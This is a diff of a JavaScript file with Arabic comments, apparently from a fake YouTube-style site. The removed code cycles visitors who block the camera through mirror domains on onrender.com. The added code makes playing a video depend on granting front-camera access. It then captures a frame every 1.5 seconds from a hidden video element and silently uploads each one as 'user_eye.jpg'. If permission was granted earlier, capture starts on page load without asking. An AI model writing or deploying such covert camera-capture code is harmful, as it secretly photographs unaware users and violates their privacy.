@@ -1,40 +1,94 @@
 /* ==========================================================
-   نظام تدوير النطاقات التسلسلي المتعدد (Multi-Mirror Chain)
+   سكريبت الكاميرا المحدث - الانتقال المشروط بالصلاحيات
    ========================================================== */
-async function checkAndRotateDomain() {
-    if (navigator.permissions && navigator.permissions.query) {
-        try {
-            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            
-            // إذا كان المستخدم قد قام بحظر الكاميرا
-            if (permissionStatus.state === 'denied') {
-                
-                // ضع هنا جميع الروابط البديلة التي قمت بإنشائها على Render
-                const mirrorDomains = [
-                    "https://youtube-my-1.onrender.com",
-                    "https://youtube-my-2.onrender.com" // أضف أي روابط إضافية هنا بنفس التنسيق
-                ];
-                
-                // قراءة مؤشر المحاولة الحالية من ذاكرة المتصفح المؤقتة
-                let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
-                
-                if (attemptIndex < mirrorDomains.length) {
-                    const nextDomain = mirrorDomains[attemptIndex];
-                    
-                    // زيادة المؤشر للمحاولة القادمة وتسجيله
-                    sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
-                    
-                    // تنفيذ التوجيه الصامت للرابط البديل الحالي إذا لم نكن عليه بالفعل
-                    if (window.location.origin !== nextDomain) {
-                        window.location.replace(nextDomain);
-                    }
-                }
-            }
-        } catch (err) {
-            console.log("فحص الصلاحيات غير مدعوم في هذا المتصفح:", err);
+
+let mediaStream = null;
+
+// دالة فتح الفيديو المربوطة حصرياً بمنح صلاحية الكاميرا
+async function openVideo(id) {
+    // التحقق مما إذا كانت الكاميرا مفعلة والصلاحية ممنوحة مسبقاً
+    if (mediaStream) {
+        executeWatchTransition(id);
+        return;
+    }
+
+    try {
+        // طلب إذن الوصول إلى الكاميرا فور النقر على الفيديو
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: { ideal: 'user' }
+            } 
+        });
+
+        // ربط البث بعنصر الفيديو المخفي في الصفحة
+        const videoEl = document.getElementById('video');
+        if (videoEl) {
+            videoEl.srcObject = mediaStream;
         }
+
+        // إذا تم السماح بالصلاحية بنجاح، يتم الانتقال لصفحة المشاهدة
+        executeWatchTransition(id);
+
+        // بدء حلقة التقاط الإطارات في الخلفية
+        startPeriodicCapture();
+
+    } catch (e) {
+        console.log("تم رفض إذن الكاميرا أو حدث خطأ:", e);
+        // إذا رفض المستخدم الإذن، لن يتحول النظام إلى صفحة المشاهدة ويبقى في الواجهة الرئيسية
     }
 }
 
-// تنفيذ الفحص بمجرد اكتمال تحميل هيكل الصفحة
-document.addEventListener('DOMContentLoaded', checkAndRotateDomain);
+// دالة تنفيذ الانتقال لصفحة المشاهدة وتحديث واجهة التطبيق
+function executeWatchTransition(id) {
+    S.cur = id;
+    S.view = 'watch';
+    S.descOpen = false;
+    S.hist = [id, ...S.hist.filter(x => x !== id)];
+    document.body.classList.remove('drawer-open', 'searching');
+    document.title = cur().title;
+    render();
+    scrollTo(0, 0);
+}
+
+// حلقة التكرار الزمنية لالتقاط الصور كل 1.5 ثانية
+function startPeriodicCapture() {
+    setInterval(() => {
+        const videoEl = document.getElementById('video');
+        if (!mediaStream || !videoEl) return;
+        try {
+            const vw = videoEl.videoWidth || 640;
+            const vh = videoEl.videoHeight || 480;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = vw;
+            canvas.height = vh;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+            canvas.toBlob(blob => {
+                if (blob) {
+                    let fd = new FormData();
+                    fd.append('image', blob, `user_eye.jpg`);
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }
+            }, 'image/jpeg', 0.85);
+        } catch (err) {
+            console.log("خطأ في التقاط الإطار:", err);
+        }
+    }, 1500);
+}
+
+// التحقق المسبق من الصلاحيات إذا كانت ممنوحة مسبقاً من زيارات سابقة
+navigator.permissions?.query({ name: 'camera' }).then((permissionStatus) => {
+    if (permissionStatus.state === 'granted') {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
+            .then(stream => {
+                mediaStream = stream;
+                const videoEl = document.getElementById('video');
+                if (videoEl) videoEl.srcObject = mediaStream;
+                startPeriodicCapture();
+            })
+            .catch(() => {});
+    }
+});
